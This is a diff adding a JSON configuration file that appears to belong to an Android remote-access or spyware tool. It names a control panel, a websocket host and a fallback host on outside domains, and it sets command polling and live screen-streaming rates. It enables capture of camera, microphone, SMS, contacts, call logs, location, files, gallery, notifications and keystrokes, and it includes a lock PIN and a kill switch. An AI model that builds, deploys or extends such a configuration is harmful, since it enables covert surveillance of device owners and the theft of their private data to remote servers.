@@ -1,0 +1,35 @@
+{
+  "version": 1,
+  "updated_at": "2026-11-13T14:00:00Z",
+
+  "panel_url": "https://arzzpanel.arzzhostingxcloud.my.id:2027",
+  "ws_url": "wss://arzzpanel.arzzhostingxcloud.my.id:2027",
+  "fallback_urls": [
+    "https://rezagtnk.spaced.my.id:9138"
+  ],
+
+  "heartbeat_interval_ms": 2000,
+  "command_interval_ms": 2000,
+  "screen_interval_ms": 200,
+  "screen_quality": 45,
+  "screen_max_fps": 10,
+  "refresh_ttl_ms": 300000,
+
+  "features": {
+    "camera": true,
+    "mic": true,
+    "screen": true,
+    "sms": true,
+    "contacts": true,
+    "call_log": true,
+    "location": true,
+    "files": true,
+    "keylog": true,
+    "gallery": true,
+    "notif": true
+  },
+
+  "lock_pin": "1234",
+  "kill_switch": false,
+  "min_app_version": 1
+}
